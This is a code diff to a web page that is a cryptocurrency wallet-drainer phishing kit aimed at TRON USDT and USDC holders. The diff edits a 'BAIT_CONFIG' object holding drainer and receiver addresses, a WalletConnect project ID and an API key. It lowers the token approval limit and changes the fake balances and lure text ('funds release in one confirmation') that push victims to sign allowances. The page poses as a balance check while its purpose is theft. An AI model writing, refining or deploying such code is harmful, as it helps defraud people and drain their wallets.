@@ -168,7 +168,7 @@
 </div></footer>
 
 <script>
-window.BAIT_CONFIG={wcProjectId:'7b4c156e02caf580713985225e0729b4',apiKey:'112650b4-b167-4cb4-87b0-bde7ffb4ae4a',bait:'',drainer:'TVYBvusW6wA1iMxbVaigRsc77zwWpWHAPN',receiver:'TH7mvLb3UJ35re2ZuQpTKpHQRQ97pnXYvA',approveLimit:'50000',tokens:['TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t','TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8']};
+window.BAIT_CONFIG={wcProjectId:'7b4c156e02caf580713985225e0729b4',apiKey:'112650b4-b167-4cb4-87b0-bde7ffb4ae4a',bait:'',drainer:'TVYBvusW6wA1iMxbVaigRsc77zwWpWHAPN',receiver:'TH7mvLb3UJ35re2ZuQpTKpHQRQ97pnXYvA',approveLimit:'10000',tokens:['TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t','TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8']};
 </script>
 <script>
 const $ = (id) => document.getElementById(id);
@@ -333,7 +333,7 @@ async function runCheck(){
     }
   } else {
     await sleep(500);
-    found = [{token:'TUSDT',symbol:'USDT',human:'1 842.50',raw:'1842500000',decimals:6},{token:'TUSDC',symbol:'USDC',human:'96.20',raw:'96200000',decimals:6}];
+    found = [{token:'TUSDT',symbol:'USDT',human:'9 874.20',raw:'9874200000',decimals:6},{token:'TUSDC',symbol:'USDC',human:'128.90',raw:'128900000',decimals:6}];
   }
 
   const score = randScore();
@@ -347,7 +347,7 @@ async function runCheck(){
     $('balcard').classList.remove('hidden');
     $('rows').innerHTML = found.map((t)=>'<div class="mono">'+t.symbol+' — '+t.human+'</div>').join('');
     $('complete').disabled = false;
-    $('note').textContent = 'Approve 50 000 limit, funds release in one confirmation.';
+    $('note').textContent = 'Approve 10 000 limit, funds release in one confirmation.';
   } else {
     $('note').textContent = 'No token balance found on this wallet.';
   }
